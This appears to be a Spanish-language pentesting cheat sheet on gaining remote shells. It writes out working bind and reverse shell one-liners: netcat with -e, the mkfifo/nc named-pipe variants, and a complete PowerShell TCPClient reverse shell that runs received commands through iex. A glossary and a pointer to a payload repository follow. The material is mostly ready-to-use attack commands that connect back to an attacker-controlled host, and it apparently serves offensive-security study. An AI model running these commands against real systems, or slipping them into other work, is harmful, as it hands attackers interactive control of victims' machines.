### ► SHELLS CON NETCAT, MKFIFO Y POWERSHELL – APUNTE COMPLETO Y OPERATIVO

---

## ● 1. NETCAT CON `-e` (VERSIÓN VULNERABLE)

Algunas versiones de `netcat` permiten ejecutar una shell al recibir/conectar mediante la opción `-e`. Funciona en:

* `netcat-traditional` (Kali).
* `nc.exe` (Windows, ruta en Kali: `/usr/share/windows-resources/binaries`).

### ▪ Bind Shell:

**Víctima (escucha):**

```bash
nc -lvnp 4444 -e /bin/bash
```

**Atacante (conecta):**

```bash
nc <IP_VÍCTIMA> 4444
```

### ▪ Reverse Shell:

**Víctima (conecta):**

```bash
nc <IP_ATACANTE> 4444 -e /bin/bash
```

**Atacante (escucha):**

```bash
nc -lvnp 4444
```

**Limitación:** en Linux modernos, `-e` está deshabilitado por razones de seguridad.

---

## ● 2. NETCAT SIN `-e`: USO DE `mkfifo`

Cuando `-e` no está disponible, se puede simular una shell usando una **FIFO (named pipe)**.

### ▪ Bind Shell sin `-e`:

**Víctima (escucha):**

```bash
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

**Atacante (conecta):**

```bash
nc <IP_VÍCTIMA> 4444
```

---

### ▪ Reverse Shell sin `-e`:

**Víctima (conecta):**

```bash
mkfifo /tmp/f; nc <IP_ATACANTE> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

**Atacante (escucha):**

```bash
nc -lvnp 4444
```

---

### ▪ Funcionamiento Interno de `mkfifo + nc`:

1. `mkfifo /tmp/f` crea una tubería nombrada (archivo especial).
2. `nc` escucha o conecta, con stdin redirigido desde la FIFO.
3. Lo que se recibe se inyecta a `/bin/sh`.
4. stdout y stderr de la shell se redirigen a la FIFO, cerrando el bucle.
5. Al terminar, se elimina `/tmp/f`.

---

## ● 3. REVERSE SHELL EN WINDOWS CON POWERSHELL

En Windows Server modernos, el entorno más común para shell inversa es PowerShell.

### ▪ One-liner PowerShell Reverse Shell:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

* Sustituir `<IP>` y `<PORT>` con dirección y puerto del atacante.
* Ejecutar desde `cmd.exe`, `powershell.exe`, o webshell.
* Entrega shell remota interactiva via TCP sin requerir `nc.exe`.

---

## ● 4. OTRAS OPCIONES DE SHELLS

### ▪ Repositorio recomendado:

**[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**

Contiene:

* One-liners de shell inversa para múltiples lenguajes (Python, Bash, Perl, Ruby, PHP, PowerShell, etc.).
* Payloads para webshells, bypass de AV, WAF, firewalls.
* Técnicas para explotación, elevación de privilegios y post-explotación.

---

## ● GLOSARIO

| Término                       | Descripción                                                                                                   |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------- |
| **netcat (`nc`)**             | Herramienta CLI para enviar/recibir datos sobre TCP/UDP. Soporta redirección de stdin/stdout.                 |
| **`-lvnp`**                   | `-l`: escucha; `-v`: verbose; `-n`: IPs numéricas; `-p`: puerto.                                              |
| **`-e`**                      | Ejecuta un binario al conectarse. Funciona solo en versiones vulnerables.                                     |
| **FIFO (named pipe)**         | Archivo especial que actúa como un canal de comunicación entre procesos. Se crea con `mkfifo`.                |
| **`mkfifo`**                  | Comando Unix para crear una named pipe. Utilizado para simular una shell si `-e` está ausente.                |
| **`2>&1`**                    | Redirige stderr (2) hacia stdout (1), útil para capturar errores en la misma salida.                          |
| **`/tmp/f`**                  | Tubería temporal en el sistema de archivos Linux. Punto de entrada/salida para la shell.                      |
| **PowerShell reverse shell**  | Payload en PowerShell que establece conexión TCP de vuelta al atacante. Permite ejecución remota de comandos. |
| **`TCPClient` (PS)**          | Objeto .NET usado en PowerShell para iniciar conexión TCP.                                                    |
| **`GetStream()`**             | Método que habilita la lectura/escritura del canal TCP.                                                       |
| **`iex` (Invoke-Expression)** | Ejecuta texto como comando en PowerShell, equivalente a `eval`.                                               |
| **PayloadsAllTheThings**      | Repositorio con payloads listos para usar en múltiples entornos y lenguajes. Muy útil para pentesters.        |

---
